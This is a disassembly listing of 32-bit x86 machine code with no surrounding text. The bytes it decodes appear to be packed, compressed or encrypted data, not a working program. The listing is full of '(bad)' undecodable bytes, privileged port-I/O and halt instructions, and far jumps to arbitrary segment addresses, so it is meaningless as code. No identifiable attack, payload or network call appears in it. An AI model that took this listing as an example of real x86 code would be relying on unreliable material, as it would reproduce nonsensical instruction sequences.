  41ec38:	add    BYTE PTR [eax],al
  41ec3a:	add    ah,dh
  41ec3c:	mov    dl,0x32
  41ec3e:	(bad)  
  41ec3f:	jbe    0x41ec17
  41ec41:	hlt    
  41ec42:	mov    dl,0xb1
  41ec44:	and    al,0xfe
  41ec46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec47:	push   edi
  41ec48:	jae    0x41ecab
  41ec4a:	and    esp,DWORD PTR ds:0xad00018f
  41ec50:	add    BYTE PTR [eax],al
  41ec52:	add    BYTE PTR [edx+edx*4],dh
  41ec55:	and    BYTE PTR [eax-0x58e2c3f3],cl
  41ec5b:	in     eax,0x6b
  41ec5d:	lock sbb ebp,eax
  41ec60:	xor    ch,BYTE PTR [ebx+0x627a6e53]
  41ec66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec67:	sub    bl,BYTE PTR [edi-0x784d2886]
  41ec6d:	inc    esp
  41ec6e:	jb     0x41ec94
  41ec70:	or     bl,BYTE PTR [eax+0x36]
  41ec73:	cmp    BYTE PTR [ebx-0x6b],ch
  41ec76:	or     BYTE PTR [esi],dl
  41ec78:	inc    esp
  41ec79:	stos   BYTE PTR es:[edi],al
  41ec7a:	hlt    
  41ec7b:	push   edi
  41ec7c:	mov    ebp,0x52f0826d
  41ec81:	or     dl,BYTE PTR [ecx+ecx*4-0x1a]
  41ec85:	loope  0x41ec76
  41ec87:	push   ebp
  41ec88:	push   0xffffffdd
  41ec8a:	fnstsw WORD PTR [edi-0x6655a2d2]
  41ec90:	fstp   DWORD PTR [ebp-0x61a453cc]
  41ec96:	add    al,0xba
  41ec98:	xchg   esi,eax
  41ec99:	pop    es
  41ec9a:	stos   DWORD PTR es:[edi],eax
  41ec9b:	cs int 0x6e
  41ec9e:	inc    edx
  41ec9f:	pop    es
  41eca0:	mov    ebx,0x1ac12b82
  41eca5:	xor    BYTE PTR es:[ebp-0x14],bl
  41eca9:	sub    esp,DWORD PTR [ebx+ecx*1]
  41ecac:	mov    esi,0xc70e44f9
  41ecb1:	cli    
  41ecb2:	or     ebp,DWORD PTR [eax]
  41ecb4:	jnp    0x41ed2b
  41ecb6:	xor    eax,0x5a360eb6
  41ecbb:	ins    WORD PTR es:[edi],dx
  41ecbd:	or     eax,ebx
  41ecbf:	and    eax,ebx
  41ecc1:	push   ecx
  41ecc2:	xor    al,BYTE PTR [edi+0x6a9bc730]
  41ecc8:	push   cs
  41ecc9:	xchg   edx,eax
  41ecca:	shr    edx,cl
  41eccc:	xor    edi,DWORD PTR ds:0x9da5a5b4
  41ecd2:	sbb    eax,0xa659ba3e
  41ecd7:	cmc    
  41ecd8:	sub    al,0x7b
  41ecda:	rcr    DWORD PTR [ebx-0x31f4fd0b],cl
  41ece0:	mov    dl,0x14
  41ece2:	out    dx,al
  41ece3:	add    al,cl
  41ece5:	jns    0x41ed3a
  41ece7:	push   es
  41ece8:	mov    ebx,0x6a4796b3
  41eced:	fldln2 
  41ecef:	add    dl,bl
  41ecf1:	jmp    0x3121:0xebd40327
  41ecf8:	in     eax,dx
  41ecf9:	mov    ebx,0xed0411b9
  41ecfe:	pop    esi
  41ecff:	pushf  
	...
  41ed08:	add    BYTE PTR [eax],al
  41ed0a:	add    BYTE PTR [edx],dh
  41ed0c:	ror    esi,cl
  41ed0e:	mov    ds:0xd37ebfef,al
  41ed13:	sub    edi,DWORD PTR [esi]
  41ed15:	out    0x3f,eax
  41ed17:	and    ah,ch
  41ed19:	iret   
  41ed1a:	aas    
  41ed1b:	ror    BYTE PTR [edi+0xad0001],cl
  41ed21:	add    BYTE PTR [eax],al
  41ed23:	xchg   ebx,eax
  41ed24:	inc    esp
  41ed25:	and    al,0x38
  41ed27:	clc    
  41ed28:	data16 mov dh,BYTE PTR ds:0xb7ddead7
  41ed2f:	stos   BYTE PTR es:[edi],al
  41ed30:	dec    esp
  41ed31:	rep lods al,BYTE PTR ds:[esi]
  41ed33:	mov    esi,0xbec3ddb1
  41ed38:	fmul   QWORD PTR [eax-0x32]
  41ed3b:	fld    QWORD PTR [esi+0x188d4d56]
  41ed41:	and    eax,0xd7eca37e
  41ed46:	inc    esi
  41ed47:	int3   
  41ed48:	mov    dh,0xc7
  41ed4a:	jae    0x41eced
  41ed4c:	jmp    0x8539:0xe75c39dc
  41ed53:	mov    bh,0x94
  41ed55:	out    0x94,al
  41ed57:	cmp    esp,esi
  41ed59:	aam    0xc7
  41ed5b:	outs   dx,DWORD PTR ds:[esi]
  41ed5c:	xchg   esp,eax
  41ed5d:	sti    
  41ed5e:	mov    cl,0xd2
  41ed60:	push   es
  41ed61:	ret    
  41ed62:	dec    edx
  41ed63:	xor    dh,ch
  41ed65:	and    eax,0x2d0959e3
  41ed6a:	xor    DWORD PTR [edx-0x57],0x6aac4235
  41ed71:	and    DWORD PTR [bp+di-0x4c],ecx
  41ed75:	sub    edx,DWORD PTR [esi+esi*1+0x4a4d0b7e]
  41ed7c:	jno    0x41ed4e
  41ed7e:	ret    0xb3d0
  41ed81:	jg     0x41edbc
  41ed83:	fnsave [ebp+0x69]
  41ed86:	and    bh,0xa1
  41ed89:	xor    eax,0x881206f8
  41ed8e:	mul    DWORD PTR [esi+0x12]
  41ed91:	std    
  41ed92:	mov    WORD PTR [eax+ebp*1],?
  41ed95:	(bad)  
  41ed96:	mov    eax,ds:0xe1492fbc
  41ed9b:	int3   
  41ed9c:	xor    DWORD PTR [eax],0x825feb78
  41eda2:	stc    
  41eda3:	in     eax,0x75
  41eda5:	adc    al,0x82
  41eda7:	jecxz  0x41ee1f
  41eda9:	push   es
  41edaa:	lock iret 
  41edac:	mov    bh,0x5
  41edae:	outs   dx,DWORD PTR ds:[esi]
  41edaf:	and    bh,BYTE PTR [ecx-0x31]
  41edb2:	fs mov edx,0xe9876a03
  41edb8:	and    al,0xfb
  41edba:	in     al,0x5a
  41edbc:	sbb    BYTE PTR [edx*8-0x59bddac1],dh
  41edc3:	(bad)  
  41edc5:	test   BYTE PTR [ecx+0x2f],cl
  41edc8:	sub    edi,DWORD PTR ds:0x8c3ea5cc
  41edce:	adc    al,0xdf
	...
  41edd8:	add    BYTE PTR [eax],al
  41edda:	add    bl,bl
  41eddc:	in     eax,dx
  41eddd:	outs   dx,BYTE PTR ds:[esi]
  41edde:	and    bh,BYTE PTR [esi-0x5d]
  41ede1:	(bad)  
  41ede3:	pop    esi
  41ede4:	(bad)  
  41ede5:	mov    DWORD PTR [ebp+0x75341d3b],ecx
  41edeb:	jg     0x41ed7d
  41eded:	add    DWORD PTR [eax],eax
  41edef:	lods   eax,DWORD PTR ds:[esi]
  41edf0:	add    BYTE PTR [eax],al
  41edf2:	add    al,cl
  41edf4:	shr    DWORD PTR [ebp+0x3b],1
  41edf7:	xchg   ebp,eax
  41edf8:	dec    ebx
  41edf9:	mov    al,0x2
  41edfb:	sub    al,BYTE PTR [ecx]
  41edfd:	sbb    eax,0x5ccad549
  41ee02:	push   ds
  41ee03:	(bad)  
  41ee04:	lds    eax,FWORD PTR [esi+eiz*4]
  41ee07:	outs   dx,DWORD PTR ds:[esi]
  41ee08:	call   0x5dfbc148
  41ee0d:	int3   
  41ee0e:	pop    es
  41ee0f:	cld    
  41ee10:	adc    eax,0x7a212bd3
  41ee15:	add    ebx,ebp
  41ee17:	xchg   DWORD PTR [edx+ebp*1],edi
  41ee1a:	push   ecx
  41ee1b:	test   al,0xf4
  41ee1d:	fsubr  DWORD PTR [ebx+0x40008c37]
  41ee23:	inc    ecx
  41ee24:	or     eax,0x37417c76
  41ee29:	mov    ebp,0x56cdf01
  41ee2e:	daa    
  41ee2f:	call   0x3084:0xf4e94736
  41ee36:	add    DWORD PTR [edx-0x1e],ecx
  41ee39:	jle    0x41ee8e
  41ee3b:	mov    ds:0x9d58360f,al
  41ee40:	sbb    eax,0x9a015bd4
  41ee45:	inc    eax
  41ee46:	mov    ebx,0x9a1960c3
  41ee4b:	in     al,0x1d
  41ee4d:	mov    eax,0x7f2f8fc9
  41ee52:	in     al,0xe5
  41ee54:	pop    ebx
  41ee55:	data16 or al,0xc5
  41ee58:	mov    DWORD PTR ds:0x2c06a291,esp
  41ee5e:	out    0x7c,al
  41ee60:	cmc    
  41ee61:	add    ecx,edi
  41ee63:	mov    ds:0xaa001c4a,al
  41ee68:	mov    bl,0x5a
  41ee6a:	test   BYTE PTR [esi+0x32b2a412],bl
  41ee70:	lea    esp,[esp+esi*1+0x3c]
  41ee74:	add    DWORD PTR [eax-0x36191216],ebp
  41ee7a:	inc    ecx
  41ee7b:	mov    ebx,0xb199dbe1
  41ee80:	in     eax,dx
  41ee81:	lods   al,BYTE PTR ds:[esi]
  41ee82:	and    edx,edi
  41ee84:	outs   dx,BYTE PTR ds:[esi]
  41ee85:	repnz (bad) 
  41ee87:	int3   
  41ee88:	pop    ds
  41ee89:	and    BYTE PTR [esi],bl
  41ee8b:	mov    ebp,0x4f83b5f5
  41ee90:	add    ecx,DWORD PTR [edi+0x3e]
  41ee93:	push   0xafa1956a
  41ee98:	ret    0x76b9
  41ee9b:	and    DWORD PTR [edx+0xada0d4],edi
	...
  41eea9:	add    BYTE PTR [eax],al
  41eeab:	add    eax,0x6f976b22
  41eeb0:	(bad)  
  41eeb2:	mov    dl,0x66
  41eeb4:	and    BYTE PTR [esi-0x1da20096],ah
  41eeba:	test   eax,0x1912c
  41eebf:	lods   eax,DWORD PTR ds:[esi]
  41eec0:	add    BYTE PTR [eax],al
  41eec2:	add    al,al
  41eec4:	std    
  41eec5:	fst    DWORD PTR [eax+eax*8+0x71cf17e9]
  41eecc:	out    dx,eax
  41eecd:	mov    eax,0xd2bd68d0
  41eed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eed3:	xor    DWORD PTR [eax],esp
  41eed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eed6:	dec    ebx
  41eed7:	ret    
  41eed8:	mov    dl,0x8e
  41eeda:	fcmove st,st(0)
  41eedc:	(bad)  
  41eedd:	jmp    0xeb15:0x65fc0d63
  41eee4:	cli    
  41eee5:	push   ds
  41eee6:	bts    DWORD PTR [ecx+0x26],edi
  41eeea:	fistp  DWORD PTR [ebp-0x7c]
  41eeed:	loop   0x41ef4c
  41eeef:	cmp    ebx,DWORD PTR [eax+0x64]
  41eef2:	mov    dh,0x6e
  41eef4:	lahf   
  41eef5:	ins    DWORD PTR es:[edi],dx
  41eef6:	or     BYTE PTR [eax-0xda2fdba],ch
  41eefc:	mov    ds:0x5c4bb1c5,eax
  41ef01:	adc    DWORD PTR [edi+ebp*2],ecx
  41ef04:	add    al,0x6f
  41ef06:	sub    DWORD PTR [edx-0xf236bbb],0x25
  41ef0d:	dec    ebp
  41ef0e:	inc    ah
  41ef10:	outs   dx,BYTE PTR ds:[esi]
  41ef11:	add    eax,0xeb435a50
  41ef16:	jmp    0xf9e7:0xe6188b63
  41ef1d:	dec    ebx
  41ef1e:	icebp  
  41ef1f:	cmp    BYTE PTR [eax+0x393e800f],bl
  41ef25:	adc    eax,0x30c814f
  41ef2a:	fcomi  st,st(1)
  41ef2c:	pop    ebp
  41ef2d:	adc    cl,BYTE PTR [edx+ecx*2+0x2c]
  41ef31:	push   ds
  41ef32:	mov    cl,0xbc
  41ef34:	sbb    al,0x52
  41ef36:	cmp    ch,dl
  41ef38:	cmp    BYTE PTR [ebx+ebp*8],ah
  41ef3b:	push   ecx
  41ef3c:	add    eax,DWORD PTR [ebp+edi*8-0x1f]
  41ef40:	mov    al,ds:0xfb2f8761
  41ef45:	xchg   edx,eax
  41ef46:	lahf   
  41ef47:	test   al,0x6a
  41ef49:	push   esp
  41ef4a:	sbb    dl,dh
  41ef4c:	fst    DWORD PTR ds:0x68d77dcf
  41ef52:	add    DWORD PTR [esi+0x5f],esp
  41ef55:	add    cl,BYTE PTR ds:0x3a015a65
  41ef5b:	xchg   esp,eax
  41ef5c:	and    DWORD PTR [eax-0x16],ebx
  41ef5f:	fdivr  DWORD PTR [edx]
  41ef61:	leave  
  41ef62:	xlat   BYTE PTR ds:[ebx]
  41ef63:	retf   
  41ef64:	mov    ch,0x5f
  41ef66:	cs mov bh,0xb
  41ef69:	(bad)  
  41ef6a:	mul    DWORD PTR [ecx]
  41ef6c:	push   edi
  41ef6d:	push   ebx
  41ef6e:	jno    0x41efc8
	...
  41ef78:	add    BYTE PTR [eax],al
  41ef7a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef80:	stc    
  41ef81:	call   esi
  41ef83:	into   
  41ef84:	inc    ebp
  41ef85:	mov    bh,0x11
  41ef87:	and    al,0x68
  41ef89:	sbb    esp,ebp
  41ef8b:	fst    DWORD PTR [ecx+0xad0001]
  41ef91:	add    BYTE PTR [eax],al
  41ef93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef94:	call   FWORD PTR ds:0x8722e70b
  41ef9a:	mov    al,ds:0x320d4fd0
  41ef9f:	sbb    al,0xd5
  41efa1:	mov    bl,BYTE PTR [edi+0x1dca9b33]
  41efa7:	aaa    
  41efa8:	loopne 0x41efb1
  41efaa:	(bad)  
  41efab:	in     eax,0xc8
  41efad:	pop    ebx
  41efae:	cld    
  41efaf:	and    al,0xe1
  41efb1:	inc    ebp
  41efb2:	xor    edx,0xbdaaf962
  41efb8:	adc    ah,BYTE PTR [ecx]
  41efba:	push   ds
  41efbb:	sub    bl,BYTE PTR [esi]
  41efbd:	out    dx,al
  41efbe:	push   eax
  41efbf:	pusha  
  41efc0:	adc    al,0xa1
  41efc2:	xor    DWORD PTR [ebp+0x68],esp
  41efc5:	in     al,dx
  41efc6:	fsubr  QWORD PTR [ecx-0x5b644fce]
  41efcc:	xchg   ecx,eax
  41efcd:	popf   
  41efce:	fdivr  DWORD PTR [ebx]
  41efd0:	sub    BYTE PTR [ecx+0x3e],0x52
  41efd4:	pop    esi
  41efd5:	jns    0x41f002
  41efd7:	cmp    DWORD PTR [edi],0xe5b1617f
  41efdd:	lea    esi,[ebx+ecx*2]
  41efe0:	setbe  BYTE PTR [ecx-0x1864fdf9]
  41efe7:	iret   
  41efe8:	xchg   BYTE PTR [ebp+0x7dbc827b],dh
  41efee:	stos   BYTE PTR es:[edi],al
  41efef:	xchg   ebx,ebx
  41eff1:	inc    edx
  41eff2:	xlat   BYTE PTR ds:[ebx]
  41eff3:	mov    cl,0x8f
  41eff5:	fsubr  DWORD PTR [ebx]
  41eff7:	pop    edx
  41eff8:	cwde   
  41eff9:	inc    eax
  41effa:	leave  
  41effb:	fsub   QWORD PTR gs:[ebx+0x68]
  41efff:	mov    DWORD PTR [edx],esi
  41f001:	pop    eax
  41f002:	and    eax,0xee63086a
  41f007:	aad    0x3
  41f009:	aad    0x36
  41f00b:	jno    0x41f08b
  41f00d:	js     0x41f054
  41f00f:	inc    edi
  41f010:	sbb    al,0x29
  41f012:	aas    
  41f013:	xchg   edi,eax
  41f014:	jae    0x41f091
  41f016:	push   cs
  41f017:	pusha  
  41f018:	mov    ebx,0x3d4eb415
  41f01d:	mov    ?,WORD PTR [edi+ebp*8-0x5b908418]
  41f024:	test   DWORD PTR [esi+0x2ef14abc],edi
  41f02a:	push   ebx
  41f02b:	fmul   QWORD PTR [esi+0x1b]
  41f02e:	and    ah,BYTE PTR [ecx]
  41f030:	inc    edi
  41f031:	ror    DWORD PTR [edi*2+0xda92807],0xc1
  41f039:	call   0xefb5da49
  41f03e:	xchg   edi,eax
  41f03f:	cmc    
	...
  41f048:	add    BYTE PTR [eax],al
  41f04a:	add    dh,bl
  41f04c:	sub    DWORD PTR [eax-0x210c002e],ebx
  41f052:	sub    eax,0x4af35f6
  41f057:	add    DWORD PTR [ecx-0x6d79eba0],ebx
  41f05d:	add    DWORD PTR [eax],eax
  41f05f:	lods   eax,DWORD PTR ds:[esi]
  41f060:	add    BYTE PTR [eax],al
  41f062:	add    BYTE PTR [ebx],al
  41f064:	jp     0x41f053
  41f066:	cmp    DWORD PTR [ebp+0x18404557],edi
  41f06c:	iret   
  41f06d:	mov    DWORD PTR [esi+0x77],esp
  41f070:	jae    0x41f02c
  41f072:	ss dec esi
  41f074:	cli    
  41f075:	ins    BYTE PTR es:[edi],dx
  41f076:	jae    0x41f085
  41f078:	push   es
  41f079:	or     eax,0x699e9fb0
  41f07e:	mov    cl,BYTE PTR [edi]
  41f080:	sub    bh,BYTE PTR ds:0x8b641d98
  41f086:	mov    ebp,0x9c353a95
  41f08b:	xchg   ecx,eax
  41f08c:	sub    al,0x25
  41f08e:	add    al,0xee
  41f090:	xchg   ecx,eax
  41f091:	fdiv   st(3),st
  41f093:	into   
  41f094:	cmp    eax,0x2c44683e
  41f099:	sub    DWORD PTR [edi],esi
  41f09b:	pop    es
  41f09c:	xchg   edi,eax
  41f09d:	add    DWORD PTR [eax],esi
  41f09f:	addr16 test al,0xe7
  41f0a2:	pop    ss
  41f0a3:	xchg   ebp,eax
  41f0a4:	out    0x88,al
  41f0a6:	cld    
  41f0a7:	mov    al,ds:0xc579ad89
  41f0ac:	cmp    eax,0xea68a845
  41f0b1:	int    0x21
  41f0b3:	es cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0b6:	mov    al,0xbc
  41f0b8:	adc    al,0xe1
  41f0ba:	lods   eax,DWORD PTR ds:[esi]
  41f0bb:	fbstp  TBYTE PTR [ebp+0x78437f7]
  41f0c1:	xchg   esp,eax
  41f0c2:	ds mov al,0xd0
  41f0c5:	lods   al,BYTE PTR ds:[esi]
  41f0c6:	cmove  eax,esi
  41f0c9:	jb     0x41f0be
  41f0cb:	(bad)  
  41f0cd:	jg     0x41f05d
  41f0cf:	test   DWORD PTR [edi],esi
  41f0d1:	dec    ebp
  41f0d2:	cmp    eax,0xc0ff9e1e
  41f0d7:	out    dx,eax
  41f0d8:	inc    ecx
  41f0d9:	in     eax,0xcc
  41f0db:	out    dx,eax
  41f0dc:	setns  BYTE PTR [edx-0x6fecad1c]
  41f0e3:	in     al,dx
  41f0e4:	sbb    eax,edx
  41f0e6:	(bad)  
  41f0e7:	js     0x41f11c
  41f0e9:	aad    0xe6
  41f0eb:	lea    eax,[edx+0x4050ca0d]
  41f0f1:	push   ds
  41f0f2:	push   ds
  41f0f3:	and    eax,0x2336a5b8
  41f0f8:	pop    esi
  41f0f9:	ins    DWORD PTR es:[edi],dx
  41f0fa:	add    BYTE PTR [esi+0x6658ae3d],cl
  41f100:	ja     0x41f0b8
  41f102:	ss fwait
  41f104:	(bad)
  41f107:	clc    
  41f108:	mov    eax,ds:0x8edaacca
  41f10d:	or     dl,cl
  41f10f:	push   ds
	...
  41f118:	add    BYTE PTR [eax],al
  41f11a:	add    BYTE PTR [esi+0x3f],cl
  41f11d:	int3   
  41f11e:	sbb    eax,0x7fdffffd
  41f123:	out    dx,eax
  41f124:	loopne 0x41f13c
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	mov    cl,0xa5
  41f12a:	daa    
  41f12b:	xor    edx,DWORD PTR [ebx+0xad0001]
  41f131:	add    BYTE PTR [eax],al
  41f133:	cli    
  41f134:	xchg   ebp,eax
  41f135:	icebp  
  41f136:	clc    
  41f137:	push   esp
  41f138:	mov    dh,0x54
  41f13a:	clc    
  41f13b:	sbb    esi,DWORD PTR [ebp+0x75]
  41f13e:	push   ebx
  41f13f:	fdiv   QWORD PTR [eax+0x38]
  41f142:	ret    
  41f143:	fcmovnbe st,st(7)
  41f145:	out    0x59,al
  41f147:	popf   
  41f148:	out    dx,al
  41f149:	or     ebx,esi
  41f14b:	mov    esp,0xeddc1ae0
  41f151:	inc    ecx
  41f152:	nop
  41f153:	scas   al,BYTE PTR es:[edi]
  41f154:	daa    
  41f155:	add    eax,0xef942e00
  41f15a:	clc    
  41f15b:	mov    ebx,0x88c71259
  41f160:	lds    edx,FWORD PTR [edx]
  41f162:	jmp    0xb1e8:0xc2aca27e
  41f169:	xor    al,0xfb
  41f16b:	mov    dh,0xe4
  41f16d:	inc    eax
  41f16e:	in     eax,dx
  41f16f:	xchg   esi,eax
  41f170:	xchg   DWORD PTR [ebp+0x450c75cf],esp
  41f176:	add    DWORD PTR ds:0x132a66ff,edi
  41f17c:	pop    es
  41f17d:	icebp  
  41f17e:	dec    edx
  41f17f:	ret    
  41f180:	bound  ecx,QWORD PTR [edi-0x69e26443]
  41f186:	inc    ecx
  41f187:	fdiv   QWORD PTR [ecx+0xf]
  41f18a:	test   eax,0xcf125d32
  41f18f:	pop    esi
  41f190:	pop    ecx
  41f191:	aaa    
  41f192:	or     BYTE PTR [eax-0x8],cl
  41f195:	ret    0x8363
  41f198:	xor    al,0xf5
  41f19a:	mov    bh,0x18
  41f19c:	cwde   
  41f19d:	jecxz  0x41f145
  41f19f:	fimul  WORD PTR [edx-0x4e]
  41f1a2:	push   edx
  41f1a3:	outs   dx,BYTE PTR ds:[esi]
  41f1a4:	mov    eax,esp
  41f1a6:	test   BYTE PTR [ecx+0x13],dh
  41f1a9:	scas   eax,DWORD PTR es:[edi]
  41f1aa:	jno    0x41f15c
  41f1ac:	fcmovu st,st(5)
  41f1ae:	shr    BYTE PTR [esi],cl
  41f1b0:	or     ecx,DWORD PTR [esi+edx*8+0x19691239]
  41f1b7:	ja     0x41f1e9
  41f1b9:	mov    DWORD PTR [ecx+0x3b0ccfd4],eax
  41f1bf:	jmp    0x257:0x77b8494
  41f1c6:	fimul  DWORD PTR [edi+0x53caffa7]
  41f1cc:	pop    esi
  41f1cd:	imul   ebp,edx,0x8dadec5e
  41f1d3:	adc    BYTE PTR [esi],dh
  41f1d5:	das    
  41f1d6:	and    edi,ecx
  41f1d8:	add    al,0x4c
  41f1da:	scas   al,BYTE PTR es:[edi]
  41f1db:	(bad)  
  41f1dc:	rol    DWORD PTR [edi+0x4d29],cl
	...
  41f1ea:	add    BYTE PTR [esi],bl
  41f1ec:	test   eax,0x7ff735f6
  41f1f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1f7:	scas   eax,DWORD PTR es:[edi]
  41f1f8:	dec    edi
  41f1f9:	cmp    edx,DWORD PTR [ebp-0x20]
  41f1fc:	xchg   ebx,eax
  41f1fd:	add    DWORD PTR [eax],eax
  41f1ff:	lods   eax,DWORD PTR ds:[esi]
  41f200:	add    BYTE PTR [eax],al
  41f202:	add    BYTE PTR [ebx-0xa],ch
  41f205:	push   edi
  41f206:	mov    BYTE PTR [ecx+0x7de43f7b],dh
  41f20c:	mov    bl,0xc6
  41f20e:	dec    edx
  41f20f:	jb     0x41f1d6
  41f211:	cmp    edx,DWORD PTR [eax+0x3b]
  41f214:	es call 0x4e95:0xb7eb9988
  41f21c:	data16 jbe 0x41f20b
  41f21f:	pop    esi
  41f220:	pushf  
  41f221:	popf   
  41f222:	shl    DWORD PTR [edi],1
  41f224:	or     dh,BYTE PTR [edi+0x79]
  41f227:	leave  
  41f228:	fist   WORD PTR [edi+ebx*4]
  41f22b:	ficomp WORD PTR [edi-0x5b29c078]
  41f231:	lods   al,BYTE PTR ds:[esi]
  41f232:	push   ebp
  41f233:	pop    ds
  41f234:	mov    bh,0xa4
  41f236:	push   esp
  41f237:	xor    BYTE PTR [edi-0x2983328c],cl
  41f23d:	les    dx,DWORD PTR [esi]
  41f240:	add    ebp,DWORD PTR [eax-0x28caaea7]
  41f246:	popa   
  41f247:	sbb    cl,dh
  41f249:	or     esi,DWORD PTR [eax+0x4275fae5]
  41f24f:	jp     0x41f2c1
  41f251:	push   es
  41f252:	stc    
  41f253:	mov    es,WORD PTR [ebx]
  41f255:	sbb    BYTE PTR [eax],0xf9
  41f258:	sub    al,0x25
  41f25a:	xchg   ecx,eax
  41f25b:	inc    ecx
  41f25c:	sbb    al,0xc5
  41f25e:	push   cs
  41f25f:	(bad)  
  41f261:	inc    esi
  41f262:	sar    BYTE PTR [ecx],1
  41f264:	jecxz  0x41f256
  41f266:	(bad)  
  41f267:	push   0x7c
  41f269:	loopne 0x41f25b
  41f26b:	lock pop edi
  41f26d:	and    eax,0xb516b66
  41f272:	sahf   
  41f273:	repnz sub eax,0x6810ea0a
  41f279:	(bad)  
  41f27b:	inc    esi
  41f27c:	xchg   ebx,eax
  41f27d:	or     al,BYTE PTR [ebx]
  41f27f:	popf   
  41f280:	cmc    
  41f281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f282:	popf   
  41f283:	enter  0x6ddf,0xa
  41f287:	(bad)  
  41f289:	pop    edx
  41f28a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f28b:	test   DWORD PTR [ecx],ecx
  41f28d:	call   0x7126673a
  41f292:	(bad)  
  41f293:	jecxz  0x41f25b
  41f295:	cmp    al,0xc2
  41f297:	out    dx,al
  41f298:	test   al,0x74
  41f29a:	mov    ebx,0x3258c730
  41f29f:	mov    edi,0xfc1e68de
  41f2a4:	(bad)  
  41f2a5:	jl     0x41f28a
  41f2a7:	sbb    al,0x21
  41f2a9:	jno    0x41f300
  41f2ab:	dec    eax
  41f2ac:	inc    ebp
  41f2ad:	pop    ecx
  41f2ae:	and    esi,edx
	...
  41f2b8:	add    BYTE PTR [eax],al
  41f2ba:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  41f2c0:	lods   eax,DWORD PTR ds:[esi]
  41f2c1:	fcomi  st,st(7)
  41f2c3:	sar    BYTE PTR [ebx],cl
  41f2c5:	(bad)  
  41f2c6:	add    BYTE PTR [ebp-0x72478d68],bl
  41f2cc:	xchg   esp,eax
  41f2cd:	add    DWORD PTR [eax],eax
  41f2cf:	lods   eax,DWORD PTR ds:[esi]
  41f2d0:	add    BYTE PTR [eax],al
  41f2d2:	add    BYTE PTR [eax],al
  41f2d4:	push   ebp
  41f2d5:	lock or BYTE PTR [esi+0x5e],ch
  41f2d9:	xor    bl,bh
  41f2db:	mov    cl,0xc2
  41f2dd:	pop    esp
  41f2de:	call   0x66bb:0x932565ae
  41f2e5:	mov    dl,0x1d
  41f2e7:	(bad)  
  41f2e8:	hlt    
  41f2e9:	xor    eax,0xb764e5f
  41f2ee:	xchg   esi,edi
  41f2f0:	and    al,BYTE PTR [ecx+0x45161a20]
  41f2f6:	rcl    DWORD PTR [edi],0x9d
  41f2f9:	adc    bl,BYTE PTR [eax]
  41f2fb:	mov    ebx,0x3a91a73c
  41f300:	sub    BYTE PTR [esi+0x3d],0xa6
  41f304:	and    al,0x3d
  41f306:	lea    ebx,[ebx]
  41f308:	xchg   ebp,eax
  41f309:	out    0x58,al
  41f30b:	icebp  
  41f30c:	int3   
  41f30d:	mov    edi,0x4e9fc7f5
  41f312:	ins    DWORD PTR es:[edi],dx
  41f313:	add    al,BYTE PTR [edi+ebx*4+0xf]
  41f317:	sub    BYTE PTR [edi-0x5eb41d4d],0x7b
  41f31e:	sbb    al,0xd6
  41f320:	sbb    al,0xe1
  41f322:	pusha  
  41f323:	inc    esp
  41f324:	lods   eax,DWORD PTR ds:[esi]
  41f325:	dec    esi
  41f326:	xor    al,0x55
  41f328:	pop    es
  41f329:	iret   
  41f32a:	mov    al,0xb5
  41f32c:	fpatan 
  41f32e:	cmc    
  41f32f:	cwde   
  41f330:	popa   
  41f331:	mov    eax,ds:0x76561a7d
  41f336:	add    eax,0x86920c4c
  41f33b:	sub    ah,BYTE PTR [edx+0x5f44472d]
  41f341:	lock add edx,0xffffff8f
  41f345:	rcl    BYTE PTR [esi],1
  41f347:	fbstp  TBYTE PTR [ecx+0x704e1cce]
  41f34d:	lock fbstp TBYTE PTR [edx-0x2]
  41f351:	xchg   ecx,eax
  41f352:	ret    0x2e57
  41f355:	mov    dl,0xbf
  41f357:	mov    es,WORD PTR [ebx+0x14b45bf1]
  41f35d:	(bad)  
  41f35e:	cli    
  41f35f:	push   cs
  41f360:	lock mov eax,ds:0xfa2a05b7
  41f366:	xchg   edi,eax
  41f367:	xchg   edi,esp
  41f369:	icebp  
  41f36a:	ins    DWORD PTR es:[edi],dx
  41f36b:	imul   eax,DWORD PTR [esi+ebp*2+0x55],0x4f92f342
  41f373:	add    al,0xf
  41f375:	les    ecx,FWORD PTR [edx]
  41f377:	push   cs
  41f378:	sar    BYTE PTR [esi+0x1c],1
  41f37b:	fwait
  41f37c:	jmp    edx
  41f37e:	push   eax
  41f37f:	stc    
	...
  41f388:	add    BYTE PTR [eax],al
  41f38a:	add    BYTE PTR [eax],cl
  41f38c:	div    DWORD PTR [edi+0x4a]
  41f38f:	dec    edx
  41f391:	cmp    eax,0x2e8eedf7
  41f396:	dec    eax
  41f397:	jnp    0x41f402
  41f399:	xchg   ebx,eax
  41f39a:	aas    
  41f39b:	cmp    dl,BYTE PTR [ebp+0xad0001]
  41f3a1:	add    BYTE PTR [eax],al
  41f3a3:	iret   
  41f3a4:	(bad)  
  41f3a5:	push   edx
  41f3a6:	xor    al,0xc6
  41f3a8:	retf   0xfa48
  41f3ab:	xchg   ebp,eax
  41f3ac:	push   0x7b85038
  41f3b1:	push   ss
  41f3b2:	pop    esi
  41f3b3:	fs mov ah,al
  41f3b6:	and    dl,al
  41f3b8:	test   cl,0xd2
  41f3bb:	dec    eax
  41f3bc:	dec    edx
  41f3bd:	lea    edx,[eax+0x4d553957]
  41f3c3:	fbld   TBYTE PTR [eax]
  41f3c5:	and    DWORD PTR [esi],edi
  41f3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3c8:	cli    
  41f3c9:	push   ss
  41f3ca:	dec    esp
  41f3cb:	mov    WORD PTR [esi+edx*4-0x151751a],ds
  41f3d2:	pushf  
  41f3d3:	push   esi
  41f3d4:	sub    ah,BYTE PTR [eax+0x8]
  41f3d7:	mov    ds:0xbe5d0a2b,al
  41f3dc:	aas    
  41f3dd:	xor    eax,0xdc81c30b
  41f3e2:	enter  0x273,0x16
